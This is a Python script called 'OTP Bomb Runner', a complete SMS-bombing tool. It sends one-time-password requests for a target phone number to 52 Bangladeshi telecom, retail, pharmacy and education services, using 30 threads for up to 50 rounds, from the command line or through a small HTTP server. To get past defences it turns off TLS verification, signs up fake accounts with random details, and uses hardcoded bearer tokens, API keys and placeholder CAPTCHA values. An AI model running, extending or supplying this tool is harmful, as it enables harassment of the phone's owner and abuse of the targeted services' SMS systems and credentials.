#!/usr/bin/env python3
"""OTP Bomb Runner - Python (zero deps, 30 workers, ~8s/round)
   Usage: python runner.py 017XXXXXXXX 5
      or: python runner.py --server [--port 8080]
"""

import sys, json, random, hashlib, time, ssl, string, threading
from urllib.parse import parse_qs, urlparse, quote as urlquote
import urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import HTTPServer, BaseHTTPRequestHandler

UA = ("Mozilla/5.0 (Linux; Android 11; Infinix X665B Build/RP1A.200720.011; wv) "
      "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/150.0.7871.124 Mobile Safari/537.36")

FN = ['Rahim','Karim','Sajid','Tanvir','Fahim','Arif','Mehedi','Rakib','Nayem','Jubayer','Sakib','Tamim','Rafi','Sohel','Imran']
LN = ['Hasan','Ahmed','Islam','Rahman','Hossain','Alam','Uddin','Khan','Mia','Sarker','Chowdhury','Ali','Sikder','Das','Roy']
EC = 'abcdefghijklmnopqrstuvwxyz0123456789'
PC = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$%'
DM = ['gmail.com','yahoo.com','outlook.com','hotmail.com']

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def rn(): return random.choice(FN), random.choice(LN)
def re(): return f"{''.join(random.choice(EC) for _ in range(random.randint(6,10)))}@{random.choice(DM)}"
def rp(): return ''.join(random.choice(PC) for _ in range(random.randint(8,12)))

def fmt_phone(raw):
    raw = raw.strip()
    if raw.startswith('+880'):
        p8 = raw[1:]
        pr = '0' + raw[4:]
    elif raw.startswith('0'):
        p8 = '880' + raw[1:]
        pr = raw
    elif raw.startswith('880'):
        p8 = raw
        pr = '0' + raw[3:]
    else:
        p8 = '880' + raw
        pr = raw if raw.startswith('0') else '0' + raw
    return {'raw': pr, 'p880': p8, 'plus': '+' + p8, 'dash': '+88-' + pr}

def http_get(url, headers=None, timeout=4):
    req = urllib.request.Request(url, headers=headers or {}, method='GET')
    return urllib.request.urlopen(req, context=CTX, timeout=timeout).read().decode(errors='ignore')

def http_post(url, data=None, headers=None, timeout=4):
    b = data.encode() if isinstance(data, str) else data
    req = urllib.request.Request(url, data=b, headers=headers or {}, method='POST')
    return urllib.request.urlopen(req, context=CTX, timeout=timeout).read().decode(errors='ignore')

def preflight(url, extra_hdrs=None):
    h = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml'}
    if extra_hdrs:
        h.update(extra_hdrs)
    try:
        return http_get(url, h, 4)
    except:
        return ''

def preflight_raw(url, extra_hdrs=None):
    """Returns (body, headers_dict) for cookie/token extraction"""
    h = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml', 'X-Requested-With': 'XMLHttpRequest'}
    if extra_hdrs:
        h.update(extra_hdrs)
    try:
        req = urllib.request.Request(url, headers=h, method='GET')
        resp = urllib.request.urlopen(req, context=CTX, timeout=4)
        body = resp.read().decode(errors='ignore')
        return body, dict(resp.getheaders())
    except:
        return '', {}

def build_request(api, phone):
    fN, lN = rn()
    fun = f"{fN} {lN}"
    em = re()
    pw = rp()
    pr = phone['raw']
    p8 = phone['p880']
    pp = phone['plus']
    pd = phone['dash']

    url = ''; body = ''; method = 'POST'
    h = {'Content-Type': 'application/json', 'Accept': 'application/json, text/plain, */*', 'User-Agent': UA}

    try:
        if api == 'binge':
            url = 'https://api.binge.buzz/api/v4/auth/otp/send'
            body = json.dumps({"phone": pp})
            h['Origin'] = 'https://binge.buzz'
        elif api == 'admissiontaker':
            url = 'https://www.admissiontaker.site/api/send-reg-otp'
            body = json.dumps({"phone_number": pr})
        elif api == 'medico':
            url = 'https://api.v2.medico.bio/patient/passwordless-login'
            body = json.dumps({"phoneNumber": pr, "deviceId": pr, "channel": "web", "userType": "patient", "type": "newUser", "otpLength": 6})
        elif api == 'chardike':
            url = 'https://api.chardike.com/api/3f8d1e74-9a5c-4f2d-a7b1-6c8e2d91f4ab/'
            body = json.dumps({"phone": pr, "otp_type": "login", "from_request": "web"})
        elif api == 'apex4u':
            url = 'https://api.apex4u.com/api/auth/login'
            body = json.dumps({"phoneNumber": pr})
        elif api == 'ghoori':
            url = 'https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn'
            body = json.dumps({"mobile_no": pr})
            h['Origin'] = 'https://ghoorilearning.com'
            h['Referer'] = 'https://ghoorilearning.com/'
            h['sec-ch-ua'] = '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"'
            h['sec-ch-ua-mobile'] = '?1'
        elif api == 'mygp':
            url = 'https://weblogin.grameenphone.com/backend/api/v1/otp'
            body = json.dumps({"msisdn": pr})
        elif api == 'shikho':
            url = 'https://api.shikho.com/auth/v2/send/sms'
            body = json.dumps({"phone": p8, "type": "student", "auth_type": "signup", "vendor": "shikho"})
        elif api == 'redx':
            url = 'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp'
            body = json.dumps({"phoneNumber": pr})
        elif api == 'fteducation':
            preflight('https://webapp.ft.education/auth/registration')
            url = 'https://webapp.ft.education/auth/registration'
            body = json.dumps({"name": fN, "mobile": p8, "fb_id": ""})
            h.update({'X-Requested-With': 'XMLHttpRequest', 'X-Inertia': 'true',
                      'X-Inertia-Version': '93ac2f75562c111176bdccff246ce6e7',
                      'Origin': 'https://webapp.ft.education'})
        elif api == 'banglalink':
            try:
                sr = http_get('https://web-api.banglalink.net/api/v1/get-secret',
                              {'User-Agent': UA, 'Origin': 'https://www.banglalink.net', 'Accept': 'application/json'}, 4)
                tk = json.loads(sr).get('data', {}).get('secret', '')
            except:
                tk = ''
            url = 'https://web-api.banglalink.net/api/v1/user/otp-login/request'
            body = json.dumps({"msisdn": pr, "secret": tk})
            h['client-security-token'] = tk
            h['Origin'] = 'https://www.banglalink.net'
        elif api == 'robi':
            url = 'https://www.robi.com.bd/en/auth/login:01882873117:01788874786'
            body = json.dumps([{"msisdn": pr}])
            h = {'Content-Type': 'text/plain;charset=UTF-8', 'Accept': 'text/x-component',
                 'User-Agent': UA, 'Origin': 'https://www.robi.com.bd',
                 'next-action': '7f085f18ad8ebc8d49e2e00713b7e5568e836b5483'}
        elif api == 'bohubrihi':
            url = 'https://bb-api.bohubrihi.com/public/activity/otp'
            body = json.dumps({"phone": pr, "intent": "login"})
        elif api == 'sheba':
            url = 'https://accountkit.sheba.xyz/api/shoot-otp'
            body = json.dumps({"mobile": pp, "app_id": "8329815A6D1AE6DD",
                              "api_token": "d1op1o9xvVPShfr2k3JNzUt4RamE84vOrYgX89bCPFKhpWuzitVVAD4uMpgM"})
        elif api == 'trucklagbe':
            url = 'https://tethys.trucklagbe.com/tl_gateway/tl_login/131/loginWithPhoneNo'
            body = json.dumps({"userType": "shipper", "phoneNo": pr})
            h['X-Bypass-Auth-Key'] = 'b6253a42-50bf-444a-8017-cd1319f4e79b-b280108f-3bdc-4ea7-964e-07e841cb5c90'
            h['deviceId'] = '103.66.168.2011784186323086'
            h['source'] = 'website'
        elif api == 'osudpotro':
            url = 'https://api.osudpotro.com/api/v1/users/send_otp'
            body = json.dumps({"mobile": pd, "deviceToken": "web", "language": "en", "os": "web"})
        elif api == 'banglamed':
            preflight('https://banglamed.net/preview/home-vue/login')
            url = 'https://banglamed.net/preview/home-vue/auth/send-otp'
            body = json.dumps({"phone_number": pr, "mode": "register", "redirect_url": ""})
            h['X-Requested-With'] = 'XMLHttpRequest'
            h['Origin'] = 'https://banglamed.net'
        elif api == 'khaasfood':
            url = 'https://www.khaasfood.com/api/auth/request-otp'
            body = json.dumps({"username": pr})
            h['pragma'] = 'no-cache'
            h['cache-control'] = 'no-cache'
        elif api == 'cookups':
            try:
                http_post('https://api.cookups.app/api/v1/subject/Session/actMaybeConstruct/n44gxxD91U6Y4C216iFzFg',
                          json.dumps({"Action": ["UpdateClientPlatform", "Web"],
                                      "Constructor": ["NewFromId", ["SessionId", "c7208e9f-fd10-4ed5-98e0-2db5ea217316"]]}),
                          {'Content-Type': 'application/json', 'User-Agent': UA}, 4)
            except:
                pass
            url = 'https://api.cookups.app/api/v1/subject/Session/actMaybeConstruct/n44gxxD91U6Y4C216iFzFg'
            body = json.dumps({"Action": ["GenerateOtp", {"Value_": ["BdMobileNumber", pp]}],
                              "Constructor": ["NewFromId", {"SessionId": "c7208e9f-fd10-4ed5-98e0-2db5ea217316"}]})
            h['Origin'] = 'https://cookups.app'
        elif api == 'arogga':
            url = 'https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=149.0.7827.160&os=Android&osv=11'
            body = f"mobile={pr}&fcmToken=&referral="
            h = {'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 'Accept': '*/*',
                 'User-Agent': UA, 'Origin': 'https://www.arogga.com'}
        elif api == 'chaldal':
            url = f"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey=ae1b1e1c&phoneNumber={urlquote(pp)}&retryAttempt=0"
            body = '{}'
            h['x-egg-clientapp'] = 'Omelette'
            h['x-egg-platform'] = 'Browser'
            h['x-egg-storeid'] = '1'
        elif api == 'shohoz':
            url = 'https://sso-live.shohoz.com/v1.0/web/auth/sign-up/request'
            body = json.dumps({"first_name": fN, "last_name": lN, "mobile_number": pr, "email": "", "gender": 1, "recaptcha": ""})
            h['X-Requested-With'] = 'XMLHttpRequest'
        elif api == 'bengalmeat':
            url = 'https://api.bengalmeat.com/auth/otp-login'
            body = json.dumps({"phone": pr})
        elif api == 'unimart':
            dob = f"{random.randint(1,28):02d}-{random.randint(1,12):02d}-{random.randint(1995,2003)}"
            url = 'https://myadmin.unimart.online/api/v1/auth/sign-up'
            body = json.dumps({"phone": pp, "dob": dob, "gender": "Male", "email": em, "password": pw, "name": fN})
            h = {'Content-Type': 'application/json; charset=UTF-8', 'Accept': '*/*',
                 'User-Agent': UA, 'authorization': 'null', 'storeid': '1',
                 'x-localization': 'en', 'zoneid': '[1]', 'moduleid': '1', 'areaid': '1'}
        elif api == 'cholpori':
            url = 'https://www.cholpori.com/api/Auth/Register'
            body = json.dumps({"firstName": fN, "lastName": lN, "phoneNumber": pr, "role": "12"})
        elif api == 'deeptoplay':
            url = 'https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en'
            body = json.dumps({"number": pp})
            h['Authorization'] = ''
        elif api == 'paperfly':
            url = 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php'
            body = json.dumps({"full_name": fun, "company_name": f"{fN} Corp", "email_address": em, "phone_number": pr})
            h['device_identifier'] = 'undefined'
            h['device_name'] = 'undefined'
        elif api == 'aarong':
            try:
                tr = http_get('https://www.aarong.com/api/auth/generate-token-web',
                              {'User-Agent': UA, 'Accept': '*/*', 'Referer': 'https://www.aarong.com/bgd/customer/account/create'}, 4)
                at = json.loads(tr).get('token', '')
            except:
                at = ''
            dob = f"{random.randint(1,28):02d}-{random.randint(1,12):02d}-{random.randint(1995,2005)}"
            url = 'https://mcprod.aarong.com/graphql'
            body = json.dumps({
                "query": 'mutation createCustomerV2($firstname:String!,$lastname:String!,$mobile_number:String!,$email:String!,$dob:String!,$gender:Int!,$password:String!,$registered_from:String!){createCustomerV2(input:{firstname:$firstname,lastname:$lastname,mobile_number:$mobile_number,email:$email,dob:$dob,gender:$gender,password:$password,registered_from:$registered_from}){customer{firstname,lastname,email,mobile_number}}}',
                "variables": {"firstname": fN, "lastname": lN, "mobile_number": pr, "email": em, "dob": dob, "gender": "1", "password": pw, "registered_from": "Web"}
            })
            h = {'Content-Type': 'application/json', 'Accept': '*/*', 'User-Agent': UA,
                 'store': 'default', 'token': at, 'Origin': 'https://www.aarong.com'}
        elif api == 'esquire':
            url = 'https://api.ecommerce.esquireelectronicsltd.com/api/otp/generate-otp'
            body = json.dumps({"phoneNo": pr})
        elif api == 'htmind':
            url = 'https://api-manager.htmind.lol/v1/auth/web/send-otp'
            body = json.dumps({"phone": pr})
            h['Origin'] = 'https://www.hellotask.app'
        elif api == 'kireibd':
            preflight('https://kireibd.com/login')
            url = 'https://frontendapi.kireibd.com/api/v2/send-login-otp'
            body = json.dumps({"email": pr})
            h['X-Requested-With'] = 'XMLHttpRequest'
        elif api == 'kabbik':
            ct = round(time.time() * 1000)
            url = 'https://api.kabbik.com/v1/auth/otpnew2'
            body = json.dumps({"msisdn": p8, "currentTimeLong": ct, "passKey": "gHxUjmKFwWPNHTGD"})
            h['authorization'] = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMjgyMCIsInJvbGUiOjEsImlhdCI6MTY2NTc0NjIyNX0.dSY47sipaGTI_OtsysFWw_kaKZKWHWRtp4vklstVgVc'
        elif api == 'cinespot':
            preflight('https://cinespot.mobi/otp/sent')
            url = 'https://cinespot.mobi/otp/sent'
            body = f"_token=x&mobile_number={pr}"
            h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA,
                 'Origin': 'https://cinespot.mobi', 'Referer': 'https://cinespot.mobi/otp/sent'}
        elif api == 'edutubebd':
            preflight(f'https://accounts.edutubebd.com/register/otp?phone={pr}&token=x',
                      {'X-Requested-With': 'XMLHttpRequest', 'X-Inertia': 'true',
                       'X-Inertia-Version': 'dc64b7f6cd379f407dccfbdc5434ffb0'})
            url = 'https://accounts.edutubebd.com/register/verify-phone'
            body = json.dumps({"phone": pr, "token": "placeholder_token"})
            h.update({'X-Requested-With': 'XMLHttpRequest', 'X-Inertia': 'true',
                      'X-Inertia-Version': 'dc64b7f6cd379f407dccfbdc5434ffb0',
                      'Origin': 'https://accounts.edutubebd.com'})
        elif api == 'propertywala':
            url = 'https://propertywala.com/Handlers/AjaxHandler.ashx'
            body = urllib.parse.urlencode({'task': 'authenticate', 'action': 'check', 'email': em,
                                           'mobile': pr, 'mobileCode': '880', 'password': '', 'name': ''})
            h = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*',
                 'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://propertywala.com',
                 'Cookie': 'locationId=20'}
        elif api == 'bengalmeat_otp':  # DUPLICATE: same as bengalmeat above
            url = 'https://api.bengalmeat.com/auth/otp-login'
            body = json.dumps({"phone": pr})
        elif api == 'perfumeshop':
            preflight('https://perfumeshop.com.bd/')
            url = 'https://perfumeshop.com.bd/wp-admin/admin-ajax.php'
            body = urllib.parse.urlencode({'action': 'psb_send_otp', 'phone': pr, 'nonce': '8065885c28'})
            h = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*',
                 'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest',
                 'Origin': 'https://perfumeshop.com.bd', 'Referer': 'https://perfumeshop.com.bd/my-account/'}
        elif api == 'bookhouse':
            preflight('https://bookhouse.com.bd/register')
            url = 'https://bookhouse.com.bd/register'
            body = urllib.parse.urlencode({'_token': 'x', 'name': fun, 'email': em, 'mobile_no': pr,
                                           'password': pw, 'password_confirmation': pw, 'referral_code': ''})
            h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA,
                 'Origin': 'https://bookhouse.com.bd', 'Referer': 'https://bookhouse.com.bd/register'}
        elif api == 'watchzonebd':
            preflight('https://watchzonebd.com/customer/register')
            url = 'https://watchzonebd.com/customer/register'
            body = urllib.parse.urlencode({'_token': 'x', 'loginDetail': '', 'name': fN, 'phone': pr,
                                           'email': em, 'address': 'Dhaka', 'password': pw, 'password_confirmation': pw})
            h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA,
                 'Origin': 'https://watchzonebd.com', 'Referer': 'https://watchzonebd.com/customer/register'}
        elif api == 'telicall':
            url = 'https://api.telicall.com/banner/phone-verification'
            body = '{}'
            h.update({'x-request-id': hashlib.md5(str(time.time()).encode()).hexdigest()[:36],
                      'x-app-version': '1.8.0', 'x-client-device-id': '0b346f54639f3b9c',
                      'x-lang': 'en', 'x-os': 'android', 'x-os-version': '11',
                      'x-req-timestamp': str(int(time.time() * 1000)),
                      'x-token': 'g4rqp88VdKknaqJOmR9KiKChN-dAYFanCZOikzOWjD4lZI299dQoqiq6zhmMEp_S',
                      'x-req-signature': 'Ca7sS+XcB6Cr7x93ayiypkdMTJZFad4EBEqOXexwcjk='})
        elif api == 'bdjob':
            url = 'https://mybdjobs.bdjobs.com/r_OtpVerifyAcconut.asp'
            body = 'tid=1lE3l3C6767936i6XAOHnW&cat_Type=0&isTTC=false&hqs=&hIsFromFair=False&hUsernameType=mobile'
            h = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA,
                 'Origin': 'https://mybdjobs.bdjobs.com'}
        elif api == 'chorcha':
            url = 'https://mujib.chorcha.net/auth/otp'
            body = json.dumps({"phone": pr, "otp": f"{random.randint(0,999999):06d}"})
            h = {'authorization': 'Bearer undefined', 'app': 'true',
                 'x-pkg': 'com.chorcha.ai', 'x-pltfm': 'android',
                 'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json'}
        elif api == 'epharma':
            preflight('https://epharma.com.bd/')
            url = 'https://epharma.com.bd/authentication/send-otp'
            body = f"number=%2B{p8}&recaptcha_token=placeholder"
            h = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*',
                 'User-Agent': UA, 'Origin': 'https://epharma.com.bd', 'X-Requested-With': 'XMLHttpRequest'}
        elif api == 'jachail':
            url = 'https://auth.jachai.com/api/v1/otp/send-register-otp'
            body = json.dumps({"countryCode": "BD", "mobileNumber": pp, "mobileNumberOrEmail": pp, "userType": "USER"})
            h = {'Content-Type': 'application/json; charset=UTF-8', 'User-Agent': 'mobile-android',
                 'devicename': 'Infinix_Infinix X665B', 'devicetype': 'ANDROID',
                 'deviceid': 'Infinix-X665B-e1f7baf3770aaa82', 'appversion': '2.1.61'}
        elif api == 'pbazaar':
            preflight(f'https://www.pbazaar.com/en/Registration/MobileNumber?ResultCode=0&MobileNumber={pr}&send-code=Send+Code')
            url = f'https://www.pbazaar.com/en/Registration/MobileNumber?ResultCode=0&MobileNumber={pr}&send-code=Send+Code'
            body = ''
            method = 'GET'
            h = {'User-Agent': UA, 'Accept': 'text/html'}
        elif api == 'iscreen':
            url = 'https://api.rockstreamer.com/otp/api/v1/phone/otp'
            body = json.dumps({"phone_number": pp})
            h['authorization'] = 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjE5NzIzMzg1IiwicHJvdmlkZXJfaWQiOiIxNzg0MjM3MTgyNDE2LUwwb3MzTVMzZDFWTmtrQVNDT1BqMUE3NmV2T1RUMEQ3NDRJR1ZWMzVmSUc3Z093aERGY2ZQQXN0NWQ2Wjk0bW8iLCJyb2xlIjo0LCJ1c2VybmFtZSI6Im5tOVhSdSIsInBsYXRmb3JtIjoiaXNjcmVlbiIsInBhcnRuZXIiOm51bGwsInN1YnNjcmliZSI6ZmFsc2UsInBhY2thZ2VJbmZvIjpudWxsLCJpc1RWT0QiOmZhbHNlLCJ0dm9kRXhwaXJlRGF0ZSI6IjE5NzAtMDEtMDEiLCJpYXQiOjE3ODQyMzcxODIsImV4cCI6MTc4NDMyMzU4Mn0.kIMtAvc0kfQpUZxaLknKo7BKUtTHC7TE126hPMoQ6wSXbk5npbcEBJbT94_MYVAD997-D4DtWQmFDur8MD4ILz6ZAeagyfOjNQ7_KEQhQQQkM3CHbreEgzc9SohqoFOTGt_VpBa3OAS0Ph8WDAPfNLtlO8zoUGx0CaqLDRZtXecHzwqsF83icXiveSECemAJmXeKCr074CRUSWAsUMAeXSjT4LVGN9unjk5cx6soWha6NG_nz9n-TL0wf64wnwwzv1cwtMPI8hoYF89KXb0VdgdNH_5ryhj09jGDZahNjtw5d99vcm-RCiT1NUed9Kd3LeexEz85g1o7Yb4oqHTxdUb6NMTOAHAZwPez6_ow8OC632KuEYrwedz2J9mj7gDnuw_H-J8mJnUZFD-kPiH78G98Dc9VvtBKonCvGJbFscOPzbO-AzUOjJp9arjY95rM_PXAG_USRTHvxWTssoX_WhcPSazAxcFr25BTWRQltwesAHceWfAOCc7th4sVC93Fwo3bEkzVv3SN-bXGDoAn4dw_seRlvT8XzTLKiTTLRgmTIN7FAVE0VMecGG7eFkLooze5I8vRyqDQM6CKaZJl56RXQ6MpBqkWBc3gdSlnO522wYqPaQ_6Q-194r2W1Ig9hhDiFJOQbJ-jbPyDgtkXnPtrODemyuO-YIcYo41LmAM'
        elif api == 'rabbithole':
            ct = int(time.time())
            hs = hashlib.sha256(f"{ct}rabbithole_secret".encode()).hexdigest()
            url = 'https://apix.rabbitholebd.com/appv2/login/requestOTP'
            body = json.dumps({"mobile": pp})
            h['current-time'] = str(ct)
            h['hash'] = hs
        elif api == 'medeasy':
            url = f'https://api.medeasy.health/api/send-otp/{pp}/'
            body = ''
            method = 'GET'
            h['Origin'] = 'https://medeasy.health'
        elif api == 'jatri':
            url = 'https://api.retail.jatri.co/auth/api/v1/send-otp'
            body = json.dumps({"phone": pr, "purpose": "USER_LOGIN", "deviceType": "WEB", "cloudFlareToken": "placeholder"})
            h['token'] = 'cSkjXjjg3LC3KudSPgt2V9gjKK0thNW5Gk26nhHJpgQr2FtjDtgptCNLSnneTG0t'
            h['x-os'] = 'Android'
            h['x-browser'] = 'Chrome'
            h['x-browser-version'] = '150'
            h['x-device-type'] = 'Mobile'
        elif api == 'shajgoj':
            url = 'https://bk.shajgoj.com/api/customers/send-otp'
            body = json.dumps({"recaptcha": "placeholder", "phone": p8})
        elif api == 'iqralive':
            url = f'https://apibeta.iqra-live.com/api/v2/sent-otp/{pr}'
            body = ''
            method = 'GET'
        elif api == 'quizgiri':
            ts = str(int(time.time()))
            dg = hashlib.sha256(f"quizgiri_salt{ts}".encode()).hexdigest()
            url = 'https://developer.quizgiri.xyz/api/v2.0/send-otp'
            body = json.dumps({"country_code": "+88", "phone": pr, "timestamp": ts, "digest": dg})
            h['Authorization'] = 'Bearer'
    except Exception as e:
        return None

    return {'url': url, 'body': body, 'headers': h, 'method': method}

# Full list of 52 APIs
APIS = [
    'binge','admissiontaker','medico','chardike','apex4u','ghoori','mygp','shikho','redx',
    'fteducation','banglalink','robi','bohubrihi','sheba','trucklagbe','osudpotro',
    'banglamed','khaasfood','cookups','arogga','chaldal','shohoz','bengalmeat','unimart',
    'cholpori','deeptoplay','paperfly','aarong','esquire','htmind','kireibd','kabbik',
    'cinespot','edutubebd','propertywala','bengalmeat_otp','perfumeshop','bookhouse',
    'watchzonebd','telicall','bdjob','chorcha','epharma','jachail','pbazaar','iscreen',
    'rabbithole','medeasy','jatri','shajgoj','iqralive','quizgiri'
]

MAX_WORKERS = 30

def call_api(api, phone):
    req = build_request(api, phone)
    if not req:
        return {'api': api, 'status': 0, 'time_ms': 0, 'error': 'build_failed'}
    t0 = time.time()
    try:
        if req['method'] == 'GET':
            http_get(req['url'], req['headers'], 5)
        else:
            http_post(req['url'], req['body'], req['headers'], 5)
        status = 200
    except urllib.error.HTTPError as e:
        status = e.code
    except Exception as e:
        status = 0
    elapsed = round((time.time() - t0) * 1000)
    return {'api': api, 'status': status, 'time_ms': elapsed}


def fire_round(phone):
    results = []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        futures = {pool.submit(call_api, api, phone): api for api in APIS}
        for f in as_completed(futures):
            results.append(f.result())
    return results


def run(phone_str, rounds):
    phone = fmt_phone(phone_str)
    t0 = time.time()
    all_results = {}

    for r in range(1, rounds + 1):
        results = fire_round(phone)
        all_results[f"round_{r}"] = {
            r['api']: {'status': r['status'], 'time_ms': r['time_ms']}
            for r in sorted(results, key=lambda x: x['api'])
        }

    total_time = round((time.time() - t0) * 1000)
    total = sum(len(v) for v in all_results.values())
    ok_count = sum(1 for v in all_results.values() for r in v.values() if 200 <= r['status'] < 300)

    return {
        'phone': phone_str,
        'rounds': rounds,
        'total_hits': total,
        'ok': ok_count,
        'fail': total - ok_count,
        'total_time_ms': total_time,
        'results': all_results
    }


def start_server(port=8080):
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            q = parse_qs(urlparse(self.path).query)
            phone = q.get('phone', [''])[0]
            rounds = min(max(int(q.get('rounds', ['1'])[0]), 1), 50)

            if phone and len(phone) >= 11:
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                # Fire and forget
                def fire_bg():
                    run(phone, rounds)
                t = threading.Thread(target=fire_bg, daemon=True)
                t.start()
                resp = json.dumps({
                    'status': 'started',
                    'phone': phone,
                    'rounds': rounds,
                    'total_apis': len(APIS),
                    'total_hits': len(APIS) * rounds,
                    'msg': f'Robort started! {len(APIS) * rounds} SMS pathano hocche.'
                })
                self.wfile.write(resp.encode())
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b'Invalid phone. Usage: /?phone=017XXXXXXXX&rounds=5')

        def log_message(self, format, *args):
            pass

    print(f"""
OTP BOMB RUNNER (Python)
========================
Server: http://0.0.0.0:{port}
Usage:  http://YOUR_IP:{port}/?phone=017XXXXXXXX&rounds=5
APIs:   {len(APIS)} total
Workers: {MAX_WORKERS} threads
""")
    server = HTTPServer(('0.0.0.0', port), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")


if __name__ == '__main__':
    if '--server' in sys.argv or '-s' in sys.argv:
        p = int(os.environ.get('PORT', 8080))
        for i, a in enumerate(sys.argv):
            if a == '--port' and i + 1 < len(sys.argv):
                p = int(sys.argv[i + 1])
        start_server(p)
    elif len(sys.argv) >= 2 and any(c.isdigit() for c in sys.argv[1]):
        phone = sys.argv[1]
        rounds = int(sys.argv[2]) if len(sys.argv) >= 3 else 1
        print(f"Fire: {phone} x {rounds} rounds ({len(APIS) * rounds} hits)")
        result = run(phone, rounds)
        print(json.dumps(result, indent=2))
    else:
        print("""
Usage:
  python runner.py 017XXXXXXXX 5    (direct fire, shows results)
  python runner.py --server          (start HTTP server on 8080)
  python runner.py --server --port 3000
""")
